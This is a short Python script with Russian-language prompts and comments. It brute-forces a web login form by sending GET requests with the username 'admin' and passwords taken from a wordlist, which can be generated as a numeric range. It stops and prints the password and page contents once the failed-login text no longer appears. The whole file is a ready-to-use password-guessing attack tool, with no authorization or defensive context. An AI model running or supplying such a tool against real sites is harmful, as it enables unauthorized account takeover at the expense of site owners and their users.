import requests
#Ввод адреса формы
url=input("Введите адрес на который ссылается форма: ")
password_error=input("Введите текст который есть только на странцие с неверного пароля:")
#Создать словарь или воспользоваться существующим?
while True:
    answer1=input("Создать словарь? (Y/N):")
    if answer1=='Y' or answer1=='y':
        answer1=1
        break
    elif answer1=='N' or answer1=='n':
        answer1=0
        break
    print("Введите 'Y' или 'N'")
#Создание словоря
if answer1==1:
    while True:
        try:
            answer2=int(input("Введите начало перебора (int):"))
            answer3=int(input("Введите конец перебора (int):"))
            with open("slovar.txt","w") as f:
                for i in range(answer2,answer3):
                    f.write(str(i)+"\n")
            break
        except:
            print("Ошибка при создании словаря. Попробуйте еще раз.")
#Брутфорс указаной формы по словарю get запросами
counter=0
with open("slovar.txt","r") as r:
    l=r.read().split()
    max_counter=len(l)
    for i in l:
        a=requests.get(url,{"login":"admin","password":str(i)})
        if (counter%(max_counter//100)==0):
            print(str(counter)+" из "+str(max_counter+1))
        #Переход на страницу с верным паролем
        if (password_error in a.text)==0:
            #Вывод пароля и текста страницы с верным паролем
            print(str(i))
            print(a.text)
            break
        counter+=1
